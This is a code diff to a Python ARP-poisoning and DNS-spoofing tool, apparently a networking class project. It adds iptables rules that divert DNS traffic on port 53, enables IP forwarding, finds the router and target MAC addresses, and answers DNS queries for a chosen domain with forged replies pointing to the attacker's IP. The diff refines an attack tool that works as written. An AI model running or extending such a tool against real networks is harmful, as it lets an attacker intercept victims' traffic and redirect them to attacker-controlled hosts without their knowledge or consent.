@@ -65,10 +65,8 @@ def parseArguments():
     parser = argparse.ArgumentParser()
 
     parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d milliways.bcit.ca")
-    parser.add_argument("-i", "--routerIP", help="Choose the host IP. Example: -i 192.168.0.8", default=routerIPAddress)
+    parser.add_argument("-i", "--routerIP", help="Choose the router IP. Example: -i 192.168.0.8", default=routerIPAddress)
     parser.add_argument("-t", "--targetIP", help="Choose the target IP. Example: -t 192.168.0.8", default=targetIPAddress)
-    parser.add_argument("-r", "--redirect", help="Optional. Choose the redirect IP or otherwise default to attacker IP. Requires -d or -a. Example: -r 192.168.0.8")
-    parser.add_argument("-a", "--all", help="Spoof every DNS request back to the attacker or use optional argument -r to specify an IP to redirect to.", action="store_true")
     return parser.parse_args()
 
 def nfQueueCallback(arguments, nfpkt):
@@ -78,29 +76,11 @@ def nfQueueCallback(arguments, nfpkt):
     if IP in pkt:
         if pkt.haslayer(DNS):
             dns = pkt.getlayer(DNS)
-            pkt_time = pkt.sprintf('%sent.time%')
 
             if not pkt.haslayer(DNSQR):
-                qr = pkt.getlayer(DNSQR) # DNS query
-                qtype_field = qr.get_field('qtype')
-                qclass_field = qr.get_field('qclass')
-                values = [ pkt_time, str(ip_src), str(ip_dst), str(dns.id), str(qr.qname), str(qtype_field.i2repr(qr, qr.qtype)), str(qclass_field.i2repr(qr, qr.qclass))]
-
                 nfpkt.accept()
-            else:
-                if arguments.all:
-                    if not arguments.redirect:
-                        malicious.spoofed_pkt(nfpkt, pkt, localIP)
-                    else:
-                        malicious.spoofed_pkt(nfpkt, pkt, arg_parser().redirectto)
-                if arguments.domain:
-                    if arguments.domain in pkt[DNS].qd.qname:
-                        if not arguments.redirect:
-                            malicious.spoofed_pkt(nfpkt, pkt, localIP)
-                        else:
-                            malicious.spoofed_pkt(nfpkt, pkt, arguments.redirectto)
-            
-            print("|".join(values))
+            elif arguments.domain in pkt[DNS].qd.qname:
+                malicious.spoofed_pkt(nfpkt, pkt, localIP)
 
 #########################################################################################################
 # FUNCTION
@@ -166,7 +146,10 @@ def main(arguments):
     #Explanation on iptables
     #PREROUTING: the chain will catch packets before they're given routing rules 
     #so it can catch all packets from the target machine
-    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j  NFQUEUE --queue-num 1') 
+    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j  NFQUEUE --queue-num 1')
+    os.system('iptables -t nat -A PREROUTING -p tcp --dport 53 -j  NFQUEUE --queue-num 1')
+
+    os.system('iptables -A FORWARD -p udp --dport 53 -j  NFQUEUE --queue-num 1')
     
     ipForward = open('/proc/sys/net/ipv4/ip_forward', 'r+')
     ipForwardReadContents = ipForward.read()
@@ -174,15 +157,24 @@ def main(arguments):
         ipForward.write('1\n')
     ipForward.close()
 
+    # stolen from the scapy code for finding arp source address at https://github.com/secdev/scapy/blob/master/scapy/layers/l2.py
+    iff,a,gw = conf.route.route(arguments.routerIP)
+    hostMACAddress = get_if_hwaddr(iff)
+
     # Send ARP request to find the target MAC
     routerMACAddress = getMACAddress(arguments.routerIP)
     targetMACAddress = getMACAddress(arguments.targetIP)
+    if not hostMACAddress:
+        print("Warning: No MAC Address for Host.")
+    else:
+        print("Host MAC Addres: {}".format(hostMACAddress))
+
     if not routerMACAddress:
-        sys.exit("No MAC Address for Host. Exiting program")
+        sys.exit("No MAC Address for Router. Exiting program")
     if targetMACAddress == None:
         sys.exit("No MAC Address for Target. Exiting program")
     else:
-        print("Host MAC Address: ", routerMACAddress)
+        print("Router MAC Address: ", routerMACAddress)
         print("Target MAC Address: ", targetMACAddress)
 
     # Create a new thread to poison the host's ARP cache, then read and respond to their DNS queries
